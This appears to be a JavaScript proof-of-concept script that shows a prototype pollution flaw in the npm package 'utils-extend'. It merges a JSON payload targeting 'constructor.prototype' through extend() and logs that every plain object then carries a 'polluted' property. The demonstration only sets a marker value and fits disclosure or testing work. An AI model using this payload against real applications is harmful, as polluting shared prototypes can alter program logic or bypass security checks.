var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const {extend} = require('utils-extend');
const payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
obj = {};
console.log({}.polluted);
const pollutionObject = JSON.parse(payload);
extend(obj, pollutionObject);
console.log({}.polluted);